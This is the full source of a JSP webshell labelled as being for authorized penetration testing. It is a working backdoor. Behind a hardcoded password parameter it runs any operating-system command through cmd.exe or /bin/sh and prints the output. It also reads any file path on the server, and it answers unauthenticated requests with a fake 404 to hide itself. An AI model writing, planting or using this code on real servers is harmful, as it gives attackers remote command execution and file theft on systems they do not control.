<%@ page import="java.io.*,java.util.*" %>
<%
// ===================================================
// JSP Webshell - For authorized penetration testing only
// ===================================================

String auth = "pentest123";
String reqAuth = request.getParameter("auth");

if (auth.equals(reqAuth)) {
    String cmd = request.getParameter("cmd");
    if (cmd != null && !cmd.isEmpty()) {
        out.println("<pre>");
        try {
            // OS detection
            String os = System.getProperty("os.name").toLowerCase();
            String[] execCmd;
            if (os.contains("win")) {
                execCmd = new String[]{"cmd.exe", "/c", cmd};
            } else {
                execCmd = new String[]{"/bin/sh", "-c", cmd};
            }
            Process p = Runtime.getRuntime().exec(execCmd);
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = br.readLine()) != null) {
                out.println(line);
            }
            // stderr
            br = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            while ((line = br.readLine()) != null) {
                out.println("[ERR] " + line);
            }
        } catch (Exception e) {
            out.println("Error: " + e.getMessage());
        }
        out.println("</pre>");
    }

    // File read
    String readPath = request.getParameter("read");
    if (readPath != null) {
        out.println("<pre>");
        try {
            BufferedReader br = new BufferedReader(new FileReader(readPath));
            String line;
            while ((line = br.readLine()) != null) {
                out.println(line);
            }
        } catch (Exception e) {
            out.println("Error: " + e.getMessage());
        }
        out.println("</pre>");
    }
} else {
    response.setStatus(404);
    out.println("Not Found");
}
%>
